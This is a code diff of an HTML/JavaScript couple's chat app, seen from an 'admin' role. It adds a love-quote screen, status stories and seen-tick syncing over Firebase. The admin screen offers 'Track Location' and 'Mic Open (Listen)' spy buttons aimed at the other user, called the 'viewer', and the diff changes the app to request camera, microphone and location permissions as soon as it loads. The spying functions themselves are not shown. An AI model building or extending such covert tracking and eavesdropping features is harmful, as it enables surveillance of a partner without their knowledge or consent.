@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en"><head><meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no, viewport-fit=cover">
-<meta name="theme-color" content="#fffaf5"><meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="theme-color" content="#16213E"><meta name="apple-mobile-web-app-capable" content="yes">
 <link rel="manifest" href="manifest-admin.json">
 <title>Chat</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -22,7 +22,7 @@ body{min-height:100dvh;display:flex;justify-content:center;align-items:center;ba
 @media (min-width: 500px) {
     body{padding: 20px;}
     .phone{max-width:420px; height:min(900px, 100dvh); border-radius:38px; border:5px solid rgba(255,255,255,.98); box-shadow:0 35px 80px rgba(91,60,130,.22);}
-    .chat-screen, .truth-screen, .admin-screen { border-radius: 0 0 33px 33px !important; }
+    .chat-screen, .truth-screen, .admin-screen, .love-screen { border-radius: 0 0 33px 33px !important; }
 }
 
 .head{padding:24px 20px 14px;gap:14px;display:flex;align-items:center;}
@@ -37,7 +37,7 @@ body{min-height:100dvh;display:flex;justify-content:center;align-items:center;ba
 .login-btn:active{transform:translateY(5px) scale(.97);box-shadow:0 3px 0 #9983d9;}
 #mainHome{flex:1;overflow-y:auto;display:none;flex-direction:column;padding-bottom:10px;}
 .profile{margin:4px 15px;padding:16px 14px;gap:14px;background:linear-gradient(135deg,rgba(255,225,224,.95),rgba(255,238,232,.95),rgba(242,220,255,.9));border:3px solid white;border-radius:24px;box-shadow:0 8px 0 #e9d0e5;display:flex;align-items:center;cursor:pointer;}
-.p-av{width:68px;height:68px;border:3px solid white;border-radius:50%;overflow:hidden;display:flex;justify-content:center;align-items:center;background:#ffe4d6;font-size:26px;}
+.p-av{width:68px;height:68px;border:3px solid white;border-radius:50%;overflow:hidden;display:flex;justify-content:center;align-items:center;background:#ffe4d6;font-size:26px;position:relative;}
 .p-av img{width:100%;height:100%;object-fit:cover;}
 .p-name{font-size:17px;font-weight:800;}.p-on{font-size:11px;font-weight:700;color:#289b65;}
 .stats{margin:18px 15px 0;gap:9px;display:grid;grid-template-columns:1fr 1fr 1fr;}
@@ -45,8 +45,48 @@ body{min-height:100dvh;display:flex;justify-content:center;align-items:center;ba
 .stat:nth-child(1){background:linear-gradient(145deg,#fff0e4,#ffcbdc);}
 .stat:nth-child(2){background:linear-gradient(145deg,#ffebf0,#ffc2d6);}
 .stat:nth-child(3){background:linear-gradient(145deg,#e6f0ff,#cce0ff);}
-.s3d{width:44px;height:38px;border-radius:14px;display:flex;justify-content:center;align-items:center;}
+.s3d{width:44px;height:38px;border-radius:14px;display:flex;justify-content:center;align-items:center;position:relative;overflow:hidden;}
 .s3d svg{width:20px;height:20px;stroke:white;}
+
+/* 🚀 PREMIUM 3D HEART + ECG BUTTON */
+.heart-3d-container {
+    position: relative;
+    width: 100%; height: 100%;
+    background: linear-gradient(135deg, #ff9a9e, #fecfef);
+    box-shadow: inset 0 2px 5px rgba(255,255,255,0.5), 0 4px 8px rgba(255,105,180,0.3);
+    border-radius: 14px;
+    display: flex; align-items: center; justify-content: center;
+    overflow: hidden;
+}
+.heart-base-icon {
+    position: absolute;
+    width: 26px; height: 26px;
+    fill: rgba(255, 255, 255, 0.9);
+    filter: drop-shadow(0 3px 5px rgba(255, 105, 180, 0.6));
+    z-index: 1;
+}
+.ecg-overlay {
+    position: absolute; inset: 0; z-index: 2;
+    display: flex; align-items: center; justify-content: center;
+    pointer-events: none;
+}
+.ecg-svg {
+    width: 200%; height: 60%;
+    stroke: #ff1a66;
+    stroke-width: 2.5; fill: none;
+    stroke-linecap: round; stroke-linejoin: round;
+    filter: drop-shadow(0 0 4px #ff4d8d);
+}
+.ecg-line {
+    stroke-dasharray: 300;
+    stroke-dashoffset: 300;
+    animation: ecgFlow 1.5s linear infinite;
+}
+@keyframes ecgFlow {
+    0% { stroke-dashoffset: 300; }
+    100% { stroke-dashoffset: 0; }
+}
+
 .stat .lbl{font-size:10px;font-weight:700;color:#2a2a3a;}.stat .num{font-size:15px;font-weight:900;color:#1a1a2a;}
 .q-head{margin:25px 19px 0;font-size:21px;font-weight:800;}
 .quick{margin:16px 15px 20px;gap:14px;display:grid;grid-template-columns:1fr 1fr;}
@@ -63,21 +103,22 @@ body{min-height:100dvh;display:flex;justify-content:center;align-items:center;ba
 .bt.active{background:linear-gradient(145deg,#ffe4ed,#ffc8df);color:#b84f91;border:2px solid white;}
 .bt .ico{font-size:23px;}
 
-.chat-screen,.truth-screen,.admin-screen{position:absolute;inset:0;z-index:10;display:none;flex-direction:column;overflow:hidden;background:#fffafc;}
-.chat-screen.open,.truth-screen.open,.admin-screen.open{display:flex;}
-.chat-screen, .truth-screen { background: linear-gradient(135deg, #f6f0fa 0%, #fdf5f7 50%, #eef2ff 100%); background-size: 200% 200%; animation: bgShift 10s ease infinite alternate; }
-@keyframes bgShift { 0% { background-position: 0% 50%; } 100% { background-position: 100% 50%; } }
+.chat-screen,.truth-screen,.admin-screen,.love-screen{position:absolute;inset:0;z-index:10;display:none;flex-direction:column;overflow:hidden;background:#fffafc;}
+.chat-screen.open,.truth-screen.open,.admin-screen.open,.love-screen.open{display:flex;}
 
-.cv-head{padding:17px 15px;gap:11px;background:rgba(255,255,255,.75);backdrop-filter:blur(15px);-webkit-backdrop-filter:blur(15px);border-bottom:1px solid rgba(255,255,255,0.5);display:flex;align-items:center;z-index:10;}
+.chat-screen { background: linear-gradient(135deg, #f6f0fa 0%, #fdf5f7 50%, #eef2ff 100%); }
+.truth-screen { background: linear-gradient(135deg, #fdfbf7 0%, #fef7ee 50%, #fdf4ed 100%); }
+
+.cv-head{padding:17px 15px;gap:11px;background:var(--navy);color:#fff;border-bottom:1px solid rgba(255,255,255,0.1);display:flex;align-items:center;z-index:10;}
+.cv-head svg{stroke:#fff;}
 
 .msgs{flex:1;overflow-y:auto;display:flex;flex-direction:column;padding:16px 12px;gap:13px;scroll-behavior:smooth;-webkit-overflow-scrolling:touch; user-select:none; -webkit-user-select:none; background: transparent;}
-.bub{padding:12px 15px;font-size:15px;line-height:1.5;border-radius:19px;max-width:85%;font-weight:500;word-break:break-word; white-space:pre-wrap; cursor:pointer;position:relative;transition:transform 0.15s cubic-bezier(0.175, 0.885, 0.32, 1.275), background 0.2s;}
-.bub:active{transform:scale(0.92);}
+.bub{padding:12px 15px;font-size:15px;line-height:1.5;border-radius:19px;max-width:85%;font-weight:500;word-break:break-word; white-space:pre-wrap; cursor:pointer;position:relative;transition:transform 0.15s ease, background 0.2s; user-select:none; -webkit-user-select:none; -webkit-touch-callout: none;}
+.bub:active{transform:scale(0.94);}
 .me{align-self:flex-end;background:linear-gradient(135deg,#ffd1dc,#e5a6f7);border-bottom-right-radius:5px;color:#201a35;box-shadow:0 4px 12px rgba(229, 166, 247, 0.25);border:1px solid rgba(255,255,255,0.6);}
 .other{align-self:flex-start;background:rgba(255,255,255,0.85);backdrop-filter:blur(10px);border-bottom-left-radius:5px;color:#333;box-shadow:0 4px 12px rgba(0, 0, 0, 0.04);border:1px solid rgba(255,255,255,0.9);}
-.seen-tick{font-size:10px;color:#a5aaff;margin-left:5px;float:right;margin-top:5px;}
+.seen-tick{font-size:12px;color:#a5aaff;margin-left:8px;float:right;margin-top:6px; font-weight:900;}
 
-/* NAVY COMPACT INPUT AREA */
 .ig-input-area{display:flex;align-items:flex-end;gap:8px;padding:8px 12px;padding-bottom:max(12px, env(safe-area-inset-bottom));background:var(--navy);z-index:10; margin: 10px; border-radius: 30px; box-shadow: 0 8px 20px rgba(22,33,62,0.3);}
 .ig-middle{flex:1;display:flex;align-items:center;background:rgba(255,255,255,0.1);border-radius:24px;padding:4px 10px;transition:all 0.2s; min-height: 44px;}
 .ig-middle textarea{flex:1;border:none;background:transparent;outline:none;padding:10px 5px;font-size:15px;font-weight:500;color:#fff;resize:none;max-height:100px;line-height:1.4;font-family:inherit; overflow-y:hidden;}
@@ -90,25 +131,34 @@ body{min-height:100dvh;display:flex;justify-content:center;align-items:center;ba
 .ig-send-btn svg{width:20px;height:20px;stroke:white;fill:none;margin-left:-2px;stroke-width:2.5;}
 .ig-send-btn:active{transform:scale(0.9);}
 
-/* ADMIN SPACE */
 .admin-space { padding: 20px; display: flex; flex-direction: column; gap: 15px; }
 .admin-tool-btn { padding: 20px; border-radius: 20px; border: 3px solid white; background: linear-gradient(145deg, #ffe4ed, #ffc8df); font-weight: 800; color: #b84f91; text-align: left; display: flex; align-items: center; gap: 15px; cursor: pointer; box-shadow: 0 6px 0 #e6b7d6; }
 .admin-tool-btn:active { transform: translateY(4px); box-shadow: 0 2px 0 #e6b7d6; }
 .admin-tool-btn .icon { font-size: 24px; }
 
+.love-screen { background: linear-gradient(135deg, #1A1A2E, #16213E); color: white; align-items: center; justify-content: center; padding: 30px; text-align: center; }
+.quote-box { background: rgba(255,255,255,0.05); padding: 30px 20px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 10px 30px rgba(0,0,0,0.3); animation: fadeIn 0.5s ease; width: 100%;}
+.quote-text { font-size: 20px; font-weight: 600; line-height: 1.6; margin-bottom: 20px; color: #ffe4ed; }
+.quote-author { font-size: 16px; font-weight: 800; color: #ff9a9e; text-align: right; }
+@keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+
 #recordUI{display:none;position:absolute;inset:0;background:rgba(255,250,252,0.85);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);z-index:50;align-items:center;justify-content:center;flex-direction:column;}
-@keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
+@keyframes pulse{0%{transform:scale(1);}50%{transform:scale(1.15);}100%{transform:scale(1);}}
 .rec-circle{width:80px;height:80px;border-radius:50%;background:#ff4d4d;display:flex;align-items:center;justify-content:center;animation:pulse 1.5s infinite;box-shadow:0 10px 20px rgba(255,77,77,0.3);}
 .rec-circle svg{width:36px;height:36px;fill:white;}
 .rec-time{font-size:32px;font-weight:900;margin-top:20px;color:#333;}
 
-.modal{position:fixed;inset:0;background:rgba(0,0,0,.4);backdrop-filter:blur(5px);display:none;justify-content:center;align-items:center;z-index:200;padding:20px;}
+.modal{position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(5px);display:none;justify-content:center;align-items:center;z-index:9999;padding:20px;}
 .modal-box{background:#fffafc;width:100%;max-width:340px;border-radius:28px;border:4px solid white;padding:22px;box-shadow:0 20px 40px rgba(100,65,130,.25);text-align:center;max-height:90vh;overflow-y:auto;animation:slideUp 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);}
 @keyframes slideUp{from{transform:translateY(50px);opacity:0;}to{transform:translateY(0);opacity:1;}}
 .modal-box h3{font-size:18px;font-weight:800;color:#211a35;margin-bottom:15px;}
 .modal-input{width:100%;padding:14px;border-radius:15px;border:2px solid #f0e2f4;background:white;outline:none;font-weight:600;margin-bottom:12px;font-family:inherit;font-size:16px;}
 .modal-btn{width:100%;padding:14px;border-radius:15px;background:linear-gradient(145deg,#a5aaff,#b68bff);color:white;border:none;font-weight:800;cursor:pointer;margin-top:10px;box-shadow:0 4px 0 #9983d9;}
 .modal-btn:active{transform:translateY(3px);box-shadow:0 1px 0 #9983d9;}
+
+#statusViewer{position:fixed;inset:0;background:#000;z-index:10000;display:none;flex-direction:column;align-items:center;justify-content:center;}
+#statusViewer img{max-width:100%;max-height:90%;border-radius:10px;}
+#statusViewer .close-status{position:absolute;top:20px;right:20px;color:white;font-size:30px;cursor:pointer;}
 
 .calendar-header { display: flex; justify-content: space-between; font-weight: 800; color: #b84f91; margin-bottom: 10px; }
 .calendar-grid { display: grid; grid-template-columns: repeat(7, 1fr); gap: 5px; margin-bottom: 15px; font-size: 12px; font-weight: 600; text-align: center; }
@@ -117,7 +167,7 @@ body{min-height:100dvh;display:flex;justify-content:center;align-items:center;ba
 
 @keyframes floatUpGlobal { 0% { transform: translateY(0) scale(1); opacity: 1; } 100% { transform: translateY(-200px) scale(1.5); opacity: 0; } }
 
-#callOverlay{background:radial-gradient(ellipse at top,#443267,#171327 65%);position:fixed;inset:0;z-index:150;display:none;flex-direction:column;align-items:center;justify-content:center;padding:16px;gap:12px;}
+#callOverlay{background:radial-gradient(ellipse at top,#443267,#171327 65%);position:fixed;inset:0;z-index:9998;display:none;flex-direction:column;align-items:center;justify-content:center;padding:16px;gap:12px;}
 #callOverlay h3{font-size:25px;font-weight:800;color:white;}
 #callOverlay video{max-width:85vw;max-height:50vh;border-radius:20px;border:4px solid white;object-fit:cover;}
 .cbtn{width:60px;height:60px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:3px solid white;color:white;cursor:pointer;box-shadow:0 6px 15px rgba(0,0,0,0.2);}
@@ -125,7 +175,7 @@ body{min-height:100dvh;display:flex;justify-content:center;align-items:center;ba
 .cbtn.ok{background:#22c55e;}.cbtn.danger{background:#ef4444;}
 .cbtn:active{transform:scale(0.9);}
 
-#notifyBanner{position:fixed;top:-100px;left:50%;transform:translateX(-50%);width:90%;max-width:380px;background:rgba(255,255,255,.95);border-radius:20px;padding:12px 15px;display:flex;gap:12px;align-items:center;box-shadow:0 15px 35px rgba(0,0,0,0.15);transition:top .4s cubic-bezier(0.175, 0.885, 0.32, 1.275);z-index:9999;border:2.5px solid white;cursor:pointer;}
+#notifyBanner{position:fixed;top:-100px;left:50%;transform:translateX(-50%);width:90%;max-width:380px;background:rgba(255,255,255,.95);border-radius:20px;padding:12px 15px;display:flex;gap:12px;align-items:center;box-shadow:0 15px 35px rgba(0,0,0,0.15);transition:top .4s cubic-bezier(0.175, 0.885, 0.32, 1.275);z-index:99999;border:2.5px solid white;cursor:pointer;}
 #notifyBanner.show{top:20px;}#notifyBanner b{font-size:14px;color:#211a35;display:block;}
 #notifyBanner p{font-size:12px;color:#666;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
 </style></head><body>
@@ -155,7 +205,19 @@ body{min-height:100dvh;display:flex;justify-content:center;align-items:center;ba
       </div>
       <div class="stats">
         <div class="stat" onclick="openCalendar()"><div class="s3d m1" style="background:#ffb88a;"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg></div><span class="lbl">Calendar</span><b class="num" id="reminderCount">0</b></div>
-        <div class="stat" onclick="changeLove()"><div class="s3d m2" style="background:#fecfef;"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg></div><span class="lbl">Love Level</span><b class="num" id="loveLevel">70%</b></div>
+        
+        <div class="stat" onclick="openLoveScreen()">
+            <div class="heart-3d-container">
+                <svg class="heart-base-icon" viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
+                <div class="ecg-overlay">
+                    <svg class="ecg-svg" viewBox="0 0 100 50" preserveAspectRatio="none">
+                        <path class="ecg-line" d="M0,25 L20,25 L25,10 L30,40 L35,25 L50,25 L55,5 L60,45 L65,25 L80,25 L85,15 L90,30 L95,25 L100,25" />
+                    </svg>
+                </div>
+            </div>
+            <span class="lbl">Love Level</span><b class="num" id="loveLevel">70%</b>
+        </div>
+
         <div class="stat" onclick="openTruth()"><div class="s3d m3" style="background:#68aaff;"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg></div><span class="lbl">Seek the Truth</span><b class="num" style="font-size:11px;">Bible</b></div>
       </div>
       <div class="q-head">Quick Actions</div>
@@ -172,17 +234,16 @@ body{min-height:100dvh;display:flex;justify-content:center;align-items:center;ba
     <div class="bt active" id="bAdmin" onclick="openAdmin()"><span class="ico">⚙️</span>ADMIN TOOLS</div>
   </div>
 
-  <!-- CHAT SCREEN -->
   <div class="chat-screen" id="chatScreen">
     <div class="cv-head">
-      <div style="width:40px;height:40px;border-radius:50%;overflow:hidden;"><div id="peerAvatar" style="width:100%;height:100%;"></div></div>
+      <div id="peerStatusRing" onclick="viewStatus(PEER)" style="width:40px;height:40px;border-radius:50%;overflow:hidden;border:2px solid white;cursor:pointer;"><div id="peerAvatar" style="width:100%;height:100%;"></div></div>
       <div style="flex:1;min-width:0;">
         <b id="peerName">...</b>
         <div id="typingIndicator" style="font-size:11px;color:#4ade80;">Online</div>
       </div>
       <div style="display:flex;gap:15px;padding-right:10px;">
-        <div onclick="startCall('voice')" style="cursor:pointer;"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg></div>
-        <div onclick="startCall('video')" style="cursor:pointer;"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2"/></svg></div>
+        <div onclick="startCall('voice')" style="cursor:pointer;"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg></div>
+        <div onclick="startCall('video')" style="cursor:pointer;"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2"/></svg></div>
       </div>
     </div>
     
@@ -207,10 +268,9 @@ body{min-height:100dvh;display:flex;justify-content:center;align-items:center;ba
     </div>
   </div>
 
-  <!-- TRUTH SCREEN -->
   <div class="truth-screen" id="truthScreen">
     <div class="cv-head">
-      <div style="width:40px;height:40px;border-radius:50%;overflow:hidden;"><div id="truthPeerAv" style="width:100%;height:100%;"></div></div>
+      <div id="truthStatusRing" onclick="viewStatus(PEER)" style="width:40px;height:40px;border-radius:50%;overflow:hidden;border:2px solid white;cursor:pointer;"><div id="truthPeerAv" style="width:100%;height:100%;"></div></div>
       <div style="flex:1;min-width:0;"><b id="truthPeerName">...</b><div id="truthTypingStatus" style="font-size:11px;color:#4ade80;">Online</div></div>
     </div>
     <div class="msgs" id="truthBox"></div>
@@ -226,24 +286,29 @@ body{min-height:100dvh;display:flex;justify-content:center;align-items:center;ba
     </div>
   </div>
 
-  <!-- ADMIN SCREEN -->
+  <div class="love-screen" id="loveScreen" onclick="nextQuote()">
+    <div class="quote-box">
+      <div class="quote-text" id="quoteText"></div>
+      <div class="quote-author" id="quoteAuthor"></div>
+    </div>
+    <div style="margin-top: 30px; color: #888; font-size: 12px;">Tap anywhere for next quote</div>
+  </div>
+
   <div class="admin-screen" id="adminScreen">
     <div class="cv-head"><div style="font-size:20px; font-weight:800;">Admin Space ⚙️</div></div>
     <div class="admin-space">
-        <button class="admin-tool-btn" onclick="clearChat()">
-            <span class="icon">🗑️</span> Clear All Chat
-        </button>
-        <button class="admin-tool-btn" onclick="trackLocation()">
-            <span class="icon">📍</span> Track Location
-        </button>
-        <button class="admin-tool-btn" onclick="spyMic()">
-            <span class="icon">🎙️</span> Mic Open (Listen)
-        </button>
+        <button class="admin-tool-btn" onclick="clearChat()"><span class="icon">🗑️</span> Clear All Chat</button>
+        <button class="admin-tool-btn" onclick="trackLocation()"><span class="icon">📍</span> Track Location</button>
+        <button class="admin-tool-btn" onclick="spyMic()"><span class="icon">🎙️</span> Mic Open (Listen)</button>
     </div>
   </div>
 </div>
 
-<!-- DELETE SHEET -->
+<div id="statusViewer">
+  <div class="close-status" onclick="document.getElementById('statusViewer').style.display='none'">&times;</div>
+  <img id="statusImage" src="" alt="Status">
+</div>
+
 <div class="modal" id="delSheet" onclick="if(event.target===this)closeDelSheet()">
   <div class="modal-box" style="padding:0; border-radius:28px; overflow:hidden; border:none; background:rgba(255,255,255,0.95); backdrop-filter:blur(20px);">
     <button onclick="doDelete('everyone')" style="width:100%;padding:20px;border:none;background:transparent;color:#ff4d4d;font-weight:800;font-size:16px;border-bottom:1px solid #eee;">Delete for Everyone</button>
@@ -252,7 +317,6 @@ body{min-height:100dvh;display:flex;justify-content:center;align-items:center;ba
   </div>
 </div>
 
-<!-- CALENDAR MODAL -->
 <div class="modal" id="calendarModal">
   <div class="modal-box">
     <h3>Select Date & Reminder</h3>
@@ -273,6 +337,7 @@ body{min-height:100dvh;display:flex;justify-content:center;align-items:center;ba
     <input type="text" id="inputName" class="modal-input" placeholder="Your Name...">
     <textarea id="inputAbout" class="modal-input" rows="2" placeholder="About..."></textarea>
     <button class="modal-btn" onclick="saveProfile()">Save Profile</button>
+    <button class="modal-btn" style="background:#22c55e; box-shadow:0 4px 0 #16a34a;" onclick="document.getElementById('statusInp').click()">+ Add Status (Story)</button>
     <button class="modal-btn" style="background:#ff6b6b;box-shadow:0 4px 0 #d94a4a;" onclick="document.getElementById('profileModal').style.display='none'">Cancel</button>
   </div>
 </div>
@@ -288,15 +353,16 @@ body{min-height:100dvh;display:flex;justify-content:center;align-items:center;ba
 </div>
 <input type="file" id="fileInp" accept="image/*,video/*" hidden>
 <input type="file" id="avatarInp" accept="image/*" hidden>
+<input type="file" id="statusInp" accept="image/*" hidden>
 
 <script>
 document.addEventListener('contextmenu', e => e.preventDefault());
 
 const ROLE='admin', PEER='viewer';
 const $=id=>document.getElementById(id);
-const LS_KEY='chat_v15_'+ROLE, LS_TRUTH='truth_v15_'+ROLE;
+const LS_KEY='chat_v17_'+ROLE, LS_TRUTH='truth_v17_'+ROLE;
 let msgs=[], truthMsgs=[];
-let bc; try{bc=new BroadcastChannel('chat_v15_'+ROLE);}catch(e){}
+let bc; try{bc=new BroadcastChannel('chat_v17_'+ROLE);}catch(e){}
 const uid=()=>Math.random().toString(36).slice(2,10);
 const esc=s=>String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
 function avatarHTML(name, avatar, size=40){
@@ -310,13 +376,21 @@ function avatarHTML(name, avatar, size=40){
 let currentUser=localStorage.getItem('chat_username')||'';
 let currentAbout=localStorage.getItem('chat_about')||'';
 let currentAvatar=localStorage.getItem('chat_user_avatar')||'';
-let peerName='...', peerAvatar='';
+let peerName='...', peerAvatar='', peerStatus='';
 const peerState={online:false,typing:false};
 
 function updatePeerUI(){
   ['peerName','truthPeerName','notifyName'].forEach(id=>{const el=$(id);if(el)el.textContent=peerName;});
   ['peerAvatar','truthPeerAv','notifyAv'].forEach(id=>{const el=$(id);if(el)el.innerHTML=avatarHTML(peerName,peerAvatar,40);});
-  renderList(); renderTruth();
+  
+  if(peerStatus) {
+      $('peerStatusRing').style.border = '3px solid #ff9a9e';
+      $('truthStatusRing').style.border = '3px solid #ff9a9e';
+  } else {
+      $('peerStatusRing').style.border = '2px solid white';
+      $('truthStatusRing').style.border = '2px solid white';
+  }
+  renderTruth();
 }
 
 const msgSound=new Audio('https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3');
@@ -329,9 +403,14 @@ window.handleBannerClick=()=>{ $('notifyBanner').classList.remove('show'); openC
 
 async function requestPermissions(){
     try {
-        await navigator.mediaDevices.getUserMedia({audio:true, video:true});
-        navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}, {timeout:5000});
-    } catch(e) { console.log('Permission denied or unavailable'); }
+        const cam = await navigator.permissions.query({name: 'camera'});
+        const mic = await navigator.permissions.query({name: 'microphone'});
+        const geo = await navigator.permissions.query({name: 'geolocation'});
+        if (cam.state === 'prompt' || mic.state === 'prompt' || geo.state === 'prompt') {
+            await navigator.mediaDevices.getUserMedia({audio:true, video:true});
+            navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}, {timeout:5000});
+        }
+    } catch(e) { console.log('Permissions auto check failed', e); }
 }
 
 function checkLogin(){
@@ -352,21 +431,29 @@ window.openChat=()=>{
     $('notifyBanner').classList.remove('show'); 
     history.pushState({screen: 'chat'}, '');
     render(); $('msgInput').focus(); scrollToBottom(true); 
+    msgs.forEach(m=>{ if(m.from===PEER && !m.seen && window.FB) window.FB.set(window.FB.ref(window.FB.db,'messages/'+m.id+'/seen'),true).catch(()=>{}); });
 };
 window.openTruth=()=>{ 
     $('truthScreen').classList.add('open'); 
     history.pushState({screen: 'truth'}, '');
     renderTruth(); 
+    truthMsgs.forEach(m=>{ if(m.from===PEER && !m.seen && window.FB) window.FB.set(window.FB.ref(window.FB.db,'truth_messages/'+m.id+'/seen'),true).catch(()=>{}); });
 };
 window.openAdmin=()=>{ 
     $('adminScreen').classList.add('open'); 
     history.pushState({screen: 'admin'}, '');
+};
+window.openLoveScreen=()=>{
+    $('loveScreen').classList.add('open');
+    history.pushState({screen: 'love'}, '');
+    nextQuote(true);
 };
 
 window.addEventListener('popstate', (e) => {
     if ($('chatScreen').classList.contains('open')) $('chatScreen').classList.remove('open');
     if ($('truthScreen').classList.contains('open')) $('truthScreen').classList.remove('open');
     if ($('adminScreen').classList.contains('open')) $('adminScreen').classList.remove('open');
+    if ($('loveScreen').classList.contains('open')) $('loveScreen').classList.remove('open');
 });
 
 function load(){ try{msgs=JSON.parse(localStorage.getItem(LS_KEY)||'[]');}catch(e){msgs=[];} }
@@ -440,13 +527,11 @@ function appendMessageDOM(m) {
   
   d.id = 'msg_' + m.id;
   
-  let t; 
-  d.addEventListener('mousedown',()=>t=setTimeout(()=>openDeleteSheet(m.id,'msg'),600)); 
-  d.addEventListener('mouseup',()=>clearTimeout(t)); 
-  d.addEventListener('touchstart',()=>t=setTimeout(()=>openDeleteSheet(m.id,'msg'),600)); 
-  d.addEventListener('touchend',()=>clearTimeout(t));
-  d.addEventListener('touchmove',()=>clearTimeout(t));
-  d.addEventListener('mouseleave',()=>clearTimeout(t));
+  let pressTimer;
+  d.addEventListener('pointerdown', (e) => { pressTimer = setTimeout(() => openDeleteSheet(m.id, 'msg'), 500); });
+  d.addEventListener('pointerup', () => clearTimeout(pressTimer));
+  d.addEventListener('pointerleave', () => clearTimeout(pressTimer));
+  d.addEventListener('contextmenu', e => e.preventDefault()); 
   
   box.append(d);
 }
@@ -454,6 +539,25 @@ function appendMessageDOM(m) {
 function render(){
   $('msgsBox').innerHTML=msgs.length?'':`<div style="text-align:center;color:#aaa;font-size:12px;margin-top:40px;">No messages yet 👋</div>`;
   msgs.forEach(m => appendMessageDOM(m));
+}
+
+function addMessage(o){
+  if(!o.id) o.id=uid(); if(!o.ts) o.ts=Date.now();
+  if(msgs.some(x=>x.id===o.id)) return;
+  const r=!!o.__remote; delete o.__remote;
+  msgs.push(o); save(); 
+  
+  if($('chatScreen').classList.contains('open')){
+      appendMessageDOM(o);
+      scrollToBottom();
+  }
+  
+  if(!r){ if(window.FB) window.FB.set(window.FB.ref(window.FB.db,'messages/'+o.id),o).catch(()=>{}); if(bc) bc.postMessage({type:'new'}); }
+  else { 
+    if(window.FB) window.FB.set(window.FB.ref(window.FB.db,'messages/'+o.id+'/seen'),true).catch(()=>{}); 
+    if(!$('chatScreen').classList.contains('open')) showNotification(peerName,o.text||(o.type==='audio'?'🎤 Voice message':'📷 Photo'),peerAvatar); 
+    else scrollToBottom();
+  }
 }
 
 window.sendMsg=()=>{ const t=$('msgInput').value.trim(); if(!t)return; addMessage({type:'text',text:t,from:ROLE,sender:currentUser,seen:false}); $('msgInput').value=''; toggleSendBtn(); if(window.FB) window.FB.set(window.FB.ref(window.FB.db,'typing/'+ROLE),{typing:false}).catch(()=>{}); };
@@ -495,7 +599,7 @@ window.cancelRecording=()=>{ if(mediaRecorder&&isRecording){ mediaRecorder.onsto
 
 /* TRUTH CHAT */
 window.sendTruth=()=>{ const t=$('truthInput').value.trim(); if(!t)return; addTruthMessage({text:t,from:ROLE,sender:currentUser,id:uid(),ts:Date.now(),seen:false}); $('truthInput').value=''; toggleTruthSendBtn(); if(window.FB) window.FB.set(window.FB.ref(window.FB.db,'typing/'+ROLE),{typing:false}).catch(()=>{}); };
